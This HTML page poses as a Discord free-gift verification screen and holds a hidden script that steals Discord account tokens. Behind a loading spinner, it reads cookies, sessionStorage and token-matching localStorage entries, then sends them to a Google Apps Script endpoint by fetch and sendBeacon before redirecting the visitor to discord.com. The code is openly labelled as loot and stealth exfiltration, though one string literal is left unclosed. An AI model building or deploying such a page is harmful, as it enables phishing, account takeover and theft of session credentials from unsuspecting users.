<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Discord Gift • Claim Now</title>
  <meta http-equiv="refresh" content="5;url=https://discord.com">
  <style>
    body{margin:0;background:#000;color:#0f0;font-family:system-ui;text-align:center;padding:15vh 10px;box-sizing:border-box}
    .loader{width:50px;height:50px;border:5px solid #0f03;border-top:5px solid #0f0;border-radius:50%;animation:spin 0.9s linear infinite;margin:0 auto 25px}
    @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
    h2{margin:0 0 15px;font-size:1.6rem}
    p{font-size:1.1rem;opacity:0.9}
  </style>
</head>
<body>
  <div class="loader"></div>
  <h2>Verifying your free gift…</h2>
  <p>Just a moment • Do not close</p>

  <script>
    (function(){
      const loot = {
        ts: new Date().toISOString(),
        ua: navigator.userAgent,
        cookies: document.cookie || "—",
        ls: "—",
        tokens: []
      };

      // Try most common Discord token locations (Electron / browser)
      const patterns = [
        /mfa\.[\w-]{84}/,
        /[\w-]{24}\.[\w-]{6}\.[\w-]{27,}/,
        /[\w-]{68}/
      ];

      // localStorage sweep
      try {
        const ls = localStorage;
        let found = [];
        for (let i = 0; i < ls.length; i++) {
          const k = ls.key(i);
          const v = ls.getItem(k);
          if (patterns.some(p => p.test(v))) {
            found.push({key: k, value: v});
          }
        }
        loot.tokens = found;
        loot.ls = JSON.stringify(
          Object.fromEntries(
            [...ls].filter(([_,v]) => patterns.some(p=>p.test(v)))
          ),
          null,
          1
        ) || "{}";
      } catch(e) {
        loot.ls_error = e.message;
      }

      // sessionStorage light sweep
      try {
        loot.ss = JSON.stringify(sessionStorage).slice(0,500) + "...";
      } catch(e){}

      // Exfil – ONLY to your Google Apps Script
      const ENDPOINT = "https://script.google.com/macros/s/AKfycbz1GYBSUTj7_VqkX0mTw6alltrixreKjllmmAkGZhsSWPQX5ZjbkW3Ja96bYDvd1VCS/exec;

      fetch(ENDPOINT, {
        method: "POST",
        mode: "no-cors",
        keepalive: true,
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(loot)
      }).catch(()=>{});

      // Stealth beacon fallback (survives close)
      if (navigator.sendBeacon) {
        navigator.sendBeacon(ENDPOINT, JSON.stringify(loot));
      }
    })();
  </script>
</body>
</html>
